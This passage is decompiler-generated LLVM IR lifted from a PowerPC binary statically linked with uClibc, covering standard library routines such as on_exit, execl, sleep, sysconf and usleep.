dec_label_pc_1001fd8c:                            ; preds = %entry, %dec_label_pc_1001fd80
  store i32 %v2_1001fd50, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1001fd98.1254 to i32), i32* @lr, align 4
  %v0_1001fd94 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_1001fd94, i32* @r3, align 4
  store i32 268565916, i32* @lr, align 4
  %v1_1001fd98 = call i32 @__GI___uClibc_fini(i32 %v0_1001fd94)
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 -23920), i32 0), label %dec_label_pc_1001fdb0, label %dec_label_pc_1001fdac

dec_label_pc_1001fdac:                            ; preds = %dec_label_pc_1001fd8c
  store i32 268565936, i32* @lr, align 4
  %v2_1001fdac = call i32 @_stdio_term(i32 %v1_1001fd98, i32 add (i32 ptrtoint (i32* @global_var_10020000.1163 to i32), i32 -23920))
  br label %dec_label_pc_1001fdb0

dec_label_pc_1001fdb0:                            ; preds = %dec_label_pc_1001fd8c, %dec_label_pc_1001fdac
  %v0_1001fdb0 = load i32, i32* @r31, align 4
  %v1_1001fdb4 = call i32 @__GI__exit(i32 %v0_1001fdb0)
  ret i32 %v1_1001fdb4

; uselistorder directives
  uselistorder label %dec_label_pc_1001fdb0, { 1, 0 }
  uselistorder label %dec_label_pc_1001fd8c, { 1, 0 }
}

define i32 @on_exit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_1001fdbc = load i32, i32* @lr, align 4
  store i32 %v0_1001fdbc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001fdd4.1255 to i32), i32* @lr, align 4
  %v0_1001fdd0 = call i32 @__new_exitfn()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v3_1001fdd8 = icmp eq i32 %v0_1001fdd0, 0
  br i1 %v3_1001fdd8, label %dec_label_pc_1001fdf4, label %dec_label_pc_1001fde0

dec_label_pc_1001fde0:                            ; preds = %entry
  %v0_1001fde0 = load i32, i32* @r31, align 4
  %v2_1001fde0 = add i32 %v0_1001fdd0, 4
  %v3_1001fde0 = inttoptr i32 %v2_1001fde0 to i32*
  store i32 %v0_1001fde0, i32* %v3_1001fde0, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001fde8 = load i32, i32* @r30, align 4
  %v2_1001fde8 = add i32 %v0_1001fdd0, 8
  %v3_1001fde8 = inttoptr i32 %v2_1001fde8 to i32*
  store i32 %v0_1001fde8, i32* %v3_1001fde8, align 4
  %v0_1001fdec = load i32, i32* %r0.global-to-local, align 4
  %v2_1001fdec = inttoptr i32 %v0_1001fdd0 to i32*
  store i32 %v0_1001fdec, i32* %v2_1001fdec, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001fdf4

dec_label_pc_1001fdf4:                            ; preds = %entry, %dec_label_pc_1001fde0
  %v0_1001fdf4 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1001fde0 ]
  store i32 %v0_1001fdbc, i32* %r0.global-to-local, align 4
  ret i32 %v0_1001fdf4

; uselistorder directives
  uselistorder label %dec_label_pc_1001fdf4, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1001fe0c = ptrtoint i32* %stack_var_0 to i32
  %v2_1001fe28 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1001fe28, i32* %r0.global-to-local, align 4
  %v2_1001fe30 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1001fe28, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001fe5c

dec_label_pc_1001fe5c:                            ; preds = %dec_label_pc_1001fe8c, %entry
  %v0_1001fe60 = phi i32 [ 0, %entry ], [ %v1_1001fe60, %dec_label_pc_1001fe8c ]
  %stack_var_-52.0 = phi i32 [ %v2_1001fe30, %entry ], [ %stack_var_-52.1, %dec_label_pc_1001fe8c ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1001fe8c ]
  %v4_1001fe5c = zext i8 %stack_var_-56.0 to i32
  %v1_1001fe60 = add i32 %v0_1001fe60, 1
  %v1_1001fe68 = mul nuw nsw i32 %v4_1001fe5c, 4
  store i32 %v1_1001fe68, i32* %r0.global-to-local, align 4
  %v2_1001fe6c = add i32 %v1_1001fe68, %v2_1001fe28
  store i32 %v2_1001fe6c, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1001fe80, label %dec_label_pc_1001fe78

dec_label_pc_1001fe78:                            ; preds = %dec_label_pc_1001fe5c
  %v1_1001fe70 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1001fe8c

dec_label_pc_1001fe80:                            ; preds = %dec_label_pc_1001fe5c
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1001fe84 = add i32 %stack_var_-52.0, 4
  store i32 %v1_1001fe84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001fe8c

dec_label_pc_1001fe8c:                            ; preds = %dec_label_pc_1001fe78, %dec_label_pc_1001fe80
  %stack_var_-52.1 = phi i32 [ %v1_1001fe84, %dec_label_pc_1001fe80 ], [ %stack_var_-52.0, %dec_label_pc_1001fe78 ]
  %v0_1001fe8c = phi i32 [ %stack_var_-52.0, %dec_label_pc_1001fe80 ], [ %v2_1001fe6c, %dec_label_pc_1001fe78 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1001fe80 ], [ %v1_1001fe70, %dec_label_pc_1001fe78 ]
  %v1_1001fe8c = inttoptr i32 %v0_1001fe8c to i32*
  %v2_1001fe8c = load i32, i32* %v1_1001fe8c, align 4
  store i32 %v2_1001fe8c, i32* %r0.global-to-local, align 4
  %v3_1001fe90 = icmp eq i32 %v2_1001fe8c, 0
  br i1 %v3_1001fe90, label %dec_label_pc_1001fe98, label %dec_label_pc_1001fe5c

dec_label_pc_1001fe98:                            ; preds = %dec_label_pc_1001fe8c
  %v1_1001fe98 = mul i32 %v1_1001fe60, 4
  store i32 %v4_1001fe0c, i32* %r0.global-to-local, align 4
  %v1_1001fea0 = add i32 %v1_1001fe98, 34
  store i32 %v1_1001fe60, i32* %ctr.global-to-local, align 4
  %v1_1001fea8 = call i32 @__asm_rlwinm(i32 %v1_1001fea0, i32 0, i32 0, i32 27)
  %v1_1001feb0 = load i32, i32* @r1, align 4
  %v3_1001feb0 = sub i32 %v1_1001feb0, %v1_1001fea8
  %v4_1001feb0 = inttoptr i32 %v3_1001feb0 to i32*
  store i32 %v4_1001fe0c, i32* %v4_1001feb0, align 4
  %v1_1001feb4 = add i32 %v3_1001feb0, 23
  store i32 %v1_1001feb4, i32* %r0.global-to-local, align 4
  %v1_1001feb8 = call i32 @__asm_rlwinm(i32 %v1_1001feb4, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1001fec0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1001fec0 = inttoptr i32 %v1_1001feb8 to i32*
  store i32 %v0_1001fec0, i32* %v2_1001fec0, align 4
  store i32 %v1_1001feb8, i32* %r11.global-to-local, align 4
  %v0_1001fec8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001fec8 = trunc i32 %v0_1001fec8 to i8
  store i32 %v2_1001fe28, i32* %r0.global-to-local, align 4
  store i32 %v2_1001fe28, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1001fedc

dec_label_pc_1001fedc:                            ; preds = %dec_label_pc_1001ff10.dec_label_pc_1001fedc_crit_edge, %dec_label_pc_1001fe98
  %v0_1001fee0 = phi i32 [ %v1_1001feb8, %dec_label_pc_1001fe98 ], [ %v0_1001fee0.pre, %dec_label_pc_1001ff10.dec_label_pc_1001fedc_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1001fe30, %dec_label_pc_1001fe98 ], [ %stack_var_-52.3, %dec_label_pc_1001ff10.dec_label_pc_1001fedc_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1001fec8, %dec_label_pc_1001fe98 ], [ %stack_var_-56.3, %dec_label_pc_1001ff10.dec_label_pc_1001fedc_crit_edge ]
  %v1_1001fee0 = add i32 %v0_1001fee0, 4
  store i32 %v1_1001fee0, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1001ff04, label %dec_label_pc_1001fef4

dec_label_pc_1001fef4:                            ; preds = %dec_label_pc_1001fedc
  %v4_1001fedc = zext i8 %stack_var_-56.2 to i32
  %v1_1001feec = add i8 %stack_var_-56.2, 1
  %v1_1001fee8 = mul nuw nsw i32 %v4_1001fedc, 4
  %v3_1001fef4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1001fef4, i32* %r0.global-to-local, align 4
  %v2_1001fefc = add i32 %v3_1001fef4, %v1_1001fee8
  br label %dec_label_pc_1001ff10

dec_label_pc_1001ff04:                            ; preds = %dec_label_pc_1001fedc
  %v1_1001ff08 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1001ff08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001ff10

dec_label_pc_1001ff10:                            ; preds = %dec_label_pc_1001fef4, %dec_label_pc_1001ff04
  %stack_var_-52.3 = phi i32 [ %v1_1001ff08, %dec_label_pc_1001ff04 ], [ %stack_var_-52.2, %dec_label_pc_1001fef4 ]
  %v0_1001ff10 = phi i32 [ %stack_var_-52.2, %dec_label_pc_1001ff04 ], [ %v2_1001fefc, %dec_label_pc_1001fef4 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1001ff04 ], [ %v1_1001feec, %dec_label_pc_1001fef4 ]
  %v1_1001ff10 = inttoptr i32 %v0_1001ff10 to i32*
  %v2_1001ff10 = load i32, i32* %v1_1001ff10, align 4
  store i32 %v2_1001ff10, i32* %r0.global-to-local, align 4
  %v2_1001ff14 = inttoptr i32 %v1_1001fee0 to i32*
  store i32 %v2_1001ff10, i32* %v2_1001ff14, align 4
  %v0_1001ff18 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ff18 = add i32 %v0_1001ff18, -1
  store i32 %v1_1001ff18, i32* %ctr.global-to-local, align 4
  %v2_1001ff18 = icmp eq i32 %v1_1001ff18, 0
  br i1 %v2_1001ff18, label %dec_label_pc_1001ff1c, label %dec_label_pc_1001ff10.dec_label_pc_1001fedc_crit_edge

dec_label_pc_1001ff10.dec_label_pc_1001fedc_crit_edge: ; preds = %dec_label_pc_1001ff10
  %v0_1001fee0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001fedc

dec_label_pc_1001ff1c:                            ; preds = %dec_label_pc_1001ff10
  %v3_1001ff20 = load i32, i32* @global_var_10045230.1256, align 4
  store i32 268566312, i32* @lr, align 4
  %v2_1001ff24 = call i32 @__GI_execve(i32 %v3_1001ff20, i32 268697600)
  %v0_1001ff28 = load i32, i32* @r1, align 4
  %v1_1001ff28 = inttoptr i32 %v0_1001ff28 to i32*
  %v2_1001ff28 = load i32, i32* %v1_1001ff28, align 4
  store i32 %v2_1001ff28, i32* %r11.global-to-local, align 4
  %v1_1001ff2c = add i32 %v2_1001ff28, 4
  %v2_1001ff2c = inttoptr i32 %v1_1001ff2c to i32*
  %v3_1001ff2c = load i32, i32* %v2_1001ff2c, align 4
  store i32 %v3_1001ff2c, i32* %r0.global-to-local, align 4
  ret i32 %v2_1001ff24

; uselistorder directives
  uselistorder i32 %v1_1001ff18, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1001fe68, { 1, 0 }
  uselistorder i32 %v1_1001fe60, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1001fe28, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i8 1, { 0, 1, 15, 10, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 11, 26, 27, 28, 29, 12, 13, 14, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 2, 3, 50, 51, 49, 52, 53, 54, 55, 56, 9, 8, 7, 6, 5, 4, 57, 58, 59 }
  uselistorder label %dec_label_pc_1001ff10, { 1, 0 }
  uselistorder label %dec_label_pc_1001fe8c, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* @r8, align 4
  %v3_1001ff48 = icmp eq i32 %arg1, 0
  br i1 %v3_1001ff48, label %dec_label_pc_100200f4, label %dec_label_pc_1001ff70.lr.ph

dec_label_pc_1001ff70.lr.ph:                      ; preds = %entry
  %v2_1001ff64 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1001ff64, i32* %r7.global-to-local, align 4
  store i32 0, i32* @r10, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001ff7042 = add i32 %v2_1001ff64, 132
  %v3_1001ff7043 = inttoptr i32 %v2_1001ff7042 to i32*
  store i32 0, i32* %v3_1001ff7043, align 4
  %v0_1001ff7444 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ff7445 = add i32 %v0_1001ff7444, -1
  store i32 %v1_1001ff7445, i32* %r11.global-to-local, align 4
  %v1_1001ff7846 = mul i32 %v1_1001ff7445, 4
  %v1_1001ff7c47 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001ff7c48 = add i32 %v1_1001ff7c47, %v1_1001ff7846
  %v0_1001ff8049 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ff8050 = add i32 %v0_1001ff8049, -1
  store i32 %v1_1001ff8050, i32* %ctr.global-to-local, align 4
  %v2_1001ff8051 = icmp eq i32 %v1_1001ff8050, 0
  br i1 %v2_1001ff8051, label %dec_label_pc_1001ff84, label %dec_label_pc_1001ff70.dec_label_pc_1001ff70_crit_edge

dec_label_pc_1001ff70.dec_label_pc_1001ff70_crit_edge: ; preds = %dec_label_pc_1001ff70.lr.ph, %dec_label_pc_1001ff70.dec_label_pc_1001ff70_crit_edge
  %v2_1001ff7c52 = phi i32 [ %v2_1001ff7c, %dec_label_pc_1001ff70.dec_label_pc_1001ff70_crit_edge ], [ %v2_1001ff7c48, %dec_label_pc_1001ff70.lr.ph ]
  %v0_1001ff70.pre = load i32, i32* @r10, align 4
  %v2_1001ff70 = add i32 %v2_1001ff7c52, 8
  %v3_1001ff70 = inttoptr i32 %v2_1001ff70 to i32*
  store i32 %v0_1001ff70.pre, i32* %v3_1001ff70, align 4
  %v0_1001ff74 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ff74 = add i32 %v0_1001ff74, -1
  store i32 %v1_1001ff74, i32* %r11.global-to-local, align 4
  %v1_1001ff78 = mul i32 %v1_1001ff74, 4
  %v1_1001ff7c = load i32, i32* %r7.global-to-local, align 4
  %v2_1001ff7c = add i32 %v1_1001ff7c, %v1_1001ff78
  %v0_1001ff80 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001ff80 = add i32 %v0_1001ff80, -1
  store i32 %v1_1001ff80, i32* %ctr.global-to-local, align 4
  %v2_1001ff80 = icmp eq i32 %v1_1001ff80, 0
  br i1 %v2_1001ff80, label %dec_label_pc_1001ff84, label %dec_label_pc_1001ff70.dec_label_pc_1001ff70_crit_edge

dec_label_pc_1001ff84:                            ; preds = %dec_label_pc_1001ff70.dec_label_pc_1001ff70_crit_edge, %dec_label_pc_1001ff70.lr.ph
  %v0_1001ff98.pre = load i32, i32* @r8, align 4
  %v2_1001ff84 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1001ff84, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1001ff98.pre, i32* %stack_var_-440, align 4
  %v0_1001ff9c = call i32 @__sigaddset()
  store i32 %v0_1001ff9c, i32* %r3.global-to-local, align 4
  %v1_1001ffa0 = icmp slt i32 %v0_1001ff9c, 0
  br i1 %v1_1001ffa0, label %dec_label_pc_100200fc, label %dec_label_pc_1001ffa8

dec_label_pc_1001ffa8:                            ; preds = %dec_label_pc_1001ff84
  %v2_1001ffa8 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268566460, i32* @lr, align 4
  %v3_1001ffb8 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1001ff84, i32 %v2_1001ffa8)
  store i32 %v3_1001ffb8, i32* %r3.global-to-local, align 4
  %v3_1001ffbc = icmp eq i32 %v3_1001ffb8, 0
  br i1 %v3_1001ffbc, label %dec_label_pc_1001ffc4, label %dec_label_pc_100200fc

dec_label_pc_1001ffc4:                            ; preds = %dec_label_pc_1001ffa8
  store i32 %v2_1001ffa8, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1001ffcc = call i32 @__sigismember()
  store i32 %v0_1001ffcc, i32* %r3.global-to-local, align 4
  %v3_1001ffd0 = icmp eq i32 %v0_1001ffcc, 0
  br i1 %v3_1001ffd0, label %dec_label_pc_1001fff0.lr.ph, label %dec_label_pc_100200bc

dec_label_pc_1001fff0.lr.ph:                      ; preds = %dec_label_pc_1001ffc4
  store i32 %v2_1001ff64, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1001ff7043, align 4
  %v0_1001fff433 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001fff434 = add i32 %v0_1001fff433, -1
  store i32 %v1_1001fff434, i32* %r11.global-to-local, align 4
  %v1_1001fff835 = mul i32 %v1_1001fff434, 4
  %v1_1001fffc36 = load i32, i32* @r8, align 4
  %v2_1001fffc37 = add i32 %v1_1001fffc36, %v1_1001fff835
  %v0_1002000038 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1002000039 = add i32 %v0_1002000038, -1
  store i32 %v1_1002000039, i32* %ctr.global-to-local, align 4
  %v2_1002000040 = icmp eq i32 %v1_1002000039, 0
  br i1 %v2_1002000040, label %dec_label_pc_10020004, label %dec_label_pc_1001fff0.dec_label_pc_1001fff0_crit_edge

dec_label_pc_1001fff0.dec_label_pc_1001fff0_crit_edge: ; preds = %dec_label_pc_1001fff0.lr.ph, %dec_label_pc_1001fff0.dec_label_pc_1001fff0_crit_edge
  %v2_1001fffc41 = phi i32 [ %v2_1001fffc, %dec_label_pc_1001fff0.dec_label_pc_1001fff0_crit_edge ], [ %v2_1001fffc37, %dec_label_pc_1001fff0.lr.ph ]
  %v0_1001fff0.pre = load i32, i32* @r10, align 4
  %v2_1001fff0 = add i32 %v2_1001fffc41, 8
  %v3_1001fff0 = inttoptr i32 %v2_1001fff0 to i32*
  store i32 %v0_1001fff0.pre, i32* %v3_1001fff0, align 4
  %v0_1001fff4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001fff4 = add i32 %v0_1001fff4, -1
  store i32 %v1_1001fff4, i32* %r11.global-to-local, align 4
  %v1_1001fff8 = mul i32 %v1_1001fff4, 4
  %v1_1001fffc = load i32, i32* @r8, align 4
  %v2_1001fffc = add i32 %v1_1001fffc, %v1_1001fff8
  %v0_10020000 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10020000 = add i32 %v0_10020000, -1
  store i32 %v1_10020000, i32* %ctr.global-to-local, align 4
  %v2_10020000 = icmp eq i32 %v1_10020000, 0
  br i1 %v2_10020000, label %dec_label_pc_10020004, label %dec_label_pc_1001fff0.dec_label_pc_1001fff0_crit_edge

dec_label_pc_10020004:                            ; preds = %dec_label_pc_1001fff0.dec_label_pc_1001fff0_crit_edge, %dec_label_pc_1001fff0.lr.ph
  store i32 %v2_1001ff84, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1002000c = call i32 @__sigaddset()
  store i32 %v0_1002000c, i32* %r3.global-to-local, align 4
  %v1_10020010 = icmp slt i32 %v0_1002000c, 0
  br i1 %v1_10020010, label %dec_label_pc_100200fc, label %dec_label_pc_10020018

dec_label_pc_10020018:                            ; preds = %dec_label_pc_10020004
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_10020020 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268566568, i32* @lr, align 4
  %v4_10020024 = call i32 @__GI_sigaction(i32 17, i32* null, i32 %v2_10020020)
  store i32 %v4_10020024, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_10020024, -1
  br i1 %tmp30, label %dec_label_pc_10020058, label %dec_label_pc_10020030

dec_label_pc_10020030:                            ; preds = %dec_label_pc_10020018
  %v0_10020030 = call i32 @__errno_location()
  store i32 %v0_10020030, i32* %r3.global-to-local, align 4
  %v1_10020038 = inttoptr i32 %v0_10020030 to i32*
  %v2_10020038 = load i32, i32* %v1_10020038, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268566604, i32* @lr, align 4
  %v3_10020048 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1001ffa8, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_10020050 = inttoptr i32 %v0_10020030 to i32*
  store i32 %v2_10020038, i32* %v2_10020050, align 4
  %v0_10020110.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10020100

dec_label_pc_10020058:                            ; preds = %dec_label_pc_10020018
  %v3_10020058 = load i32, i32* %stack_var_-176, align 4
  %v3_10020064 = icmp eq i32 %v3_10020058, 1
  br i1 %v3_10020064, label %dec_label_pc_1002006c, label %dec_label_pc_100200a0

dec_label_pc_1002006c:                            ; preds = %dec_label_pc_10020058
  store i32 %v2_1001ff64, i32* %r3.global-to-local, align 4
  store i32 268566648, i32* @lr, align 4
  %v2_10020074 = call i32 @nanosleep(i32 %v2_1001ff64, i32 %v2_1001ff64)
  store i32 %v2_10020074, i32* %r3.global-to-local, align 4
  store i32 %v2_10020074, i32* @r31, align 4
  %v0_1002007c = call i32 @__errno_location()
  store i32 %v0_1002007c, i32* %r3.global-to-local, align 4
  %v1_10020080 = inttoptr i32 %v0_1002007c to i32*
  %v2_10020080 = load i32, i32* %v1_10020080, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268566680, i32* @lr, align 4
  %v3_10020094 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1001ffa8, i32 0)
  store i32 %v3_10020094, i32* %r3.global-to-local, align 4
  %v2_10020098 = inttoptr i32 %v0_1002007c to i32*
  store i32 %v2_10020080, i32* %v2_10020098, align 4
  %v0_100200c8.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_100200c8

dec_label_pc_100200a0:                            ; preds = %dec_label_pc_10020058
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268566704, i32* @lr, align 4
  %v3_100200ac = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1001ffa8, i32 0)
  br label %dec_label_pc_100200bc

dec_label_pc_100200bc:                            ; preds = %dec_label_pc_1001ffc4, %dec_label_pc_100200a0
  store i32 %v2_1001ff64, i32* %r3.global-to-local, align 4
  store i32 268566724, i32* @lr, align 4
  %v2_100200c0 = call i32 @nanosleep(i32 %v2_1001ff64, i32 %v2_1001ff64)
  store i32 %v2_100200c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100200c8

dec_label_pc_100200c8:                            ; preds = %dec_label_pc_1002006c, %dec_label_pc_100200bc
  %v0_100200c8 = phi i32 [ %v0_100200c8.pr, %dec_label_pc_1002006c ], [ %v2_100200c0, %dec_label_pc_100200bc ]
  %v3_100200c8 = icmp eq i32 %v0_100200c8, 0
  br i1 %v3_100200c8, label %dec_label_pc_100200f4, label %dec_label_pc_100200d0

dec_label_pc_100200d0:                            ; preds = %dec_label_pc_100200c8
  %v3_100200e0 = load i32, i32* %stack_var_-440, align 4
  %v0_100200e4 = call i32 @__asm_mfcr()
  store i32 %v0_100200e4, i32* %r3.global-to-local, align 4
  %v1_100200e8 = call i32 @__asm_rlwinm(i32 %v0_100200e4, i32 30, i32 31, i32 31)
  %v2_100200ec = add i32 %v3_100200e0, %v1_100200e8
  store i32 %v2_100200ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10020100

dec_label_pc_100200f4:                            ; preds = %dec_label_pc_100200c8, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10020100

dec_label_pc_100200fc:                            ; preds = %dec_label_pc_1001ffa8, %dec_label_pc_10020004, %dec_label_pc_1001ff84
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10020100

dec_label_pc_10020100:                            ; preds = %dec_label_pc_100200f4, %dec_label_pc_100200d0, %dec_label_pc_10020030, %dec_label_pc_100200fc
  %v0_10020110 = phi i32 [ 0, %dec_label_pc_100200f4 ], [ %v2_100200ec, %dec_label_pc_100200d0 ], [ %v0_10020110.pre, %dec_label_pc_10020030 ], [ -1, %dec_label_pc_100200fc ]
  ret i32 %v0_10020110

; uselistorder directives
  uselistorder i32 %v1_10020000, { 1, 0 }
  uselistorder i32 %v2_1001ffa8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_1001ff80, { 1, 0 }
  uselistorder i32 %v2_1001ff64, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 0, 6, 1, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 2 }
  uselistorder i32* %r11.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 4, 0, 1, 9, 8, 5, 2, 3 }
  uselistorder i32 ()* @__sigismember, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10020100, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100200fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100200c8, { 1, 0 }
  uselistorder label %dec_label_pc_100200bc, { 1, 0 }
  uselistorder label %dec_label_pc_1001fff0.dec_label_pc_1001fff0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1001ff70.dec_label_pc_1001ff70_crit_edge, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v2_1002011c = icmp ugt i32 %arg1, 149
  br i1 %v2_1002011c, label %dec_label_pc_1002014c, label %dec_label_pc_10020128

dec_label_pc_10020128:                            ; preds = %entry
  %v1_1002012c = mul i32 %arg1, 4
  store i32 ptrtoint (i32* @global_var_1002f0ec.1257 to i32), i32* %r9.global-to-local, align 4
  %v2_10020134 = add i32 %v1_1002012c, ptrtoint (i32* @global_var_1002f0ec.1257 to i32)
  %v3_10020134 = inttoptr i32 %v2_10020134 to i32*
  %v4_10020134 = load i32, i32* %v3_10020134, align 4
  %v2_10020138 = add i32 %v4_10020134, ptrtoint (i32* @global_var_1002f0ec.1257 to i32)
  call void @__pseudo_branch(i32 %v2_10020138)
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10020290

dec_label_pc_1002014c:                            ; preds = %entry
  %v0_1002014c = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10020158 = inttoptr i32 %v0_1002014c to i32*
  store i32 22, i32* %v2_10020158, align 4
  %v0_10020294.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10020290

dec_label_pc_10020290:                            ; preds = %dec_label_pc_1002014c, %dec_label_pc_10020128
  %v0_10020294 = phi i32 [ %v0_10020294.pre, %dec_label_pc_1002014c ], [ 1, %dec_label_pc_10020128 ]
  ret i32 %v0_10020294

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 0, 1, 3, 2 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_100202c0 = udiv i32 %arg1, 1000000
  %v2_100202c4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100202c0, i32* %stack_var_-24, align 4
  store i32 268567264, i32* @lr, align 4
  %v2_100202dc = call i32 @nanosleep(i32 %v2_100202c4, i32 0)
  ret i32 %v2_100202dc

; uselistorder directives
  uselistorder i32 (i32, i32)* @nanosleep, { 1, 3, 2, 0 }
}

define i32 @__libc_pthread_init(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_10045228.1259 to i32)
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_1002034c:
